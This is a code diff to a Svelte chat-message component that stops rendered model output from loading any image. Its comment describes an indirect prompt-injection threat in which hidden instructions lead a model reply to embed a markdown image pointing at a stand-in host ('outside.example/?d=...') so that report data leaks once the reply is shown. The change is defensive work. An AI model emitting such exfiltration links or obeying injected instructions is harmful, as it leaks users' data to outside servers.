@@ -23,6 +23,14 @@
 
   let { markdown = false, text = "", role, class: className, children }: Props = $props();
 
+  // Security (2026-10-06): model output never loads an image. A reply that
+  // follows an instruction hidden in a transcript, document or web source
+  // could otherwise embed ![](https://outside.example/?d=...) and send report
+  // data to that server just by being shown. Streamdown renders a blocked
+  // image as "[Image blocked: alt]". Links stay http and https only (the
+  // wildcard's own rule) and need a click.
+  const NO_IMAGES: string[] = [];
+
   const inherited = getMessageRoleContext();
   const resolvedRole = $derived(role ?? inherited?.role ?? "assistant");
 
@@ -35,7 +43,7 @@
 
 <div class={cn(roleClass, className)}>
   {#if markdown}
-    <Streamdown content={text} />
+    <Streamdown content={text} allowedImagePrefixes={NO_IMAGES} />
   {:else if children}
     {@render children()}
   {:else}
